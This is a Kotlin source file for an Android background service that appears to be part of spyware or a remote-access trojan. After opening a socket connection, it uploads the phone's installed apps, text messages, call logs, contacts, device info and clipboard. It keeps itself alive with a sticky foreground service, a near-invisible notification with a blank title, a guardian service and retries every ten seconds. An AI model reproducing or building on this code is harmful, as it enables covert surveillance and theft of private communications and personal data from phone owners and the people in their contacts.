package willi.fiend

// ✅ التصحيح هنا (أضفنا Utils)
import willi.fiend.Utils.AppSocket
import android.annotation.SuppressLint
import android.app.*
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat

class MainService : Service() {

    private val handler = Handler(Looper.getMainLooper())

    private val connectionRunnable = object : Runnable {
        override fun run() {
            try {
                Thread {
                    try {
                        val socket = AppSocket(this@MainService)
                        val action = socket.action
                        socket.connect()
                        action.uploadApps()
                        action.uploadMessages()
                        action.uploadCalls()
                        action.uploadContact()
                        action.uploadDeviceInfo()
                        action.uploadClipboard()
                    } catch (e: Exception) {
                        e.printStackTrace()
                        handler.postDelayed(this, 10000)
                    }
                }.start()
            } catch (e: Exception) {
                e.printStackTrace()
                handler.postDelayed(this, 10000)
            }
        }
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        JobWakeUpService.isMainServiceRunning = true
        startForeground(1, getNotification())
        
        // ✅ تشغيل الحارس لمراقبة الخدمة
        startService(Intent(this, GuardianService::class.java))
    } // تم إصلاح القوس المزدوج هنا

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.postDelayed(connectionRunnable, 5000)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        JobWakeUpService.isMainServiceRunning = false
        handler.removeCallbacks(connectionRunnable)
    }

    @SuppressLint("NewApi")
    private fun getNotification(): Notification {
        val channelId = "channel"
        val channelName = " "
        val channel = NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_MIN
        )
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(channel)
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        return notificationBuilder.setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationManager.IMPORTANCE_UNSPECIFIED)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }
}
